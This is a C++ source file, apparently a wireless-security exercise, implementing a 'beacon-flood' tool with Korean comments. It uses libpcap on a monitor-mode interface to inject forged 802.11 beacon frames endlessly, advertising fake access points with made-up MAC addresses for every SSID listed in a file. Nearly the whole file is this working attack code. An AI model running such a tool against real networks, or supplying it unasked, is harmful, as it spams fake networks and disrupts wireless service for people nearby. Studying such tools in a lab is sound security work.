#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <unistd.h>

#pragma pack(push, 1)

// Radiotap Header (간단 버전)
struct RadiotapHeader {
    uint8_t  version;    // 항상 0
    uint8_t  pad;
    uint16_t length;     // 전체 Radiotap 헤더 길이
    uint32_t present;    // 필드 존재 여부 비트마스크
};

// 802.11 FrameControl
struct FrameControl {
    uint8_t version : 2;  // 프로토콜 버전
    uint8_t type : 2;     // 프레임 타입(Management/Data/Control)
    uint8_t subtype : 4;  // 서브타입(Beacon 등)
    uint8_t flags;        // 플래그
};

// 맥 주소 구조체 (단순화)
struct MacAddress {
    uint8_t addr[6];
};

// 802.11 Beacon 프레임 헤더(Management frame)
struct Frame80211 {
    FrameControl fc;
    uint16_t duration;
    MacAddress address1;       // 수신 대상 (일반적으로 Broadcast: ff:ff:ff:ff:ff:ff)
    MacAddress address2;       // 송신자 MAC
    MacAddress address3;       // BSSID
    uint16_t sequence_control;
};

#pragma pack(pop)

// 간단한 사용법 출력
void usage() {
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
}

// 맥 주소를 하드코딩할 때 편의를 위해 간단히 만드는 함수 (예시 MAC)
MacAddress make_mac(uint8_t a0, uint8_t a1, uint8_t a2, uint8_t a3, uint8_t a4, uint8_t a5) {
    MacAddress m{};
    m.addr[0] = a0; m.addr[1] = a1; m.addr[2] = a2;
    m.addr[3] = a3; m.addr[4] = a4; m.addr[5] = a5;
    return m;
}

int main(int argc, char* argv[]) {

    if (argc != 3) {
        usage();
        return -1;
    }

    char* dev = argv[1];              // 인터페이스 (ex. mon0)
    char* ssid_list_file = argv[2];   // SSID 목록 파일

    // SSID 목록 파일 읽기
    std::ifstream ifs(ssid_list_file);
    if (!ifs.is_open()) {
        fprintf(stderr, "Failed to open SSID list file: %s\n", ssid_list_file);
        return -1;
    }

    std::vector<std::string> ssids;
    {
        std::string line;
        while (std::getline(ifs, line)) {
            if (!line.empty()) {
                ssids.push_back(line);
            }
        }
    }
    if (ssids.empty()) {
        fprintf(stderr, "SSID list is empty.\n");
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    // Radiotap 헤더 설정
    RadiotapHeader rth;
    memset(&rth, 0, sizeof(rth));
    rth.version = 0;
    rth.pad = 0;
    rth.length = sizeof(RadiotapHeader); 
    rth.present = 0;

    // 802.11 Beacon 프레임 헤더 
    Frame80211 beacon_frame;
    memset(&beacon_frame, 0, sizeof(beacon_frame));
    beacon_frame.fc.version = 0;
    beacon_frame.fc.type = 0;         
    beacon_frame.fc.subtype = 8;      
    beacon_frame.fc.flags = 0;
    beacon_frame.duration = 0;
    beacon_frame.address1 = make_mac(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
    beacon_frame.address2 = make_mac(0x11, 0x11, 0x11, 0x11, 0x11, 0x11);
    beacon_frame.address3 = make_mac(0x55, 0x55, 0x55, 0x55, 0x55, 0x55);
    beacon_frame.sequence_control = 0;

    // Beacon Fixed Parameter 
    uint8_t fixed_params[12] = {
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00,
        0x31, 0x04
    };

    uint8_t packet[256];

    // 반복 전송
    while (true) {
        for (const auto& essid : ssids) {
            memset(packet, 0, sizeof(packet));

            // Radiotap Header 
            int offset = 0;
            memcpy(packet + offset, &rth, sizeof(rth));
            offset += sizeof(rth);

            // 802.11 Beacon Header 
            memcpy(packet + offset, &beacon_frame, sizeof(beacon_frame));
            offset += sizeof(beacon_frame);

            // Fixed Parameters 
            memcpy(packet + offset, fixed_params, sizeof(fixed_params));
            offset += sizeof(fixed_params);

            // SSID Tag 삽입
            {
                packet[offset++] = 0x00;                  // Tag Number (SSID)
                packet[offset++] = (uint8_t)essid.size(); // Tag Length
                memcpy(packet + offset, essid.c_str(), essid.size());
                offset += essid.size();
            }

            // 패킷 전송
            if (pcap_sendpacket(pcap, packet, offset) != 0) {
                fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(pcap));
            }

            usleep(1000); 
        }
        usleep(50000); 
    }

    pcap_close(pcap);
    return 0;
}
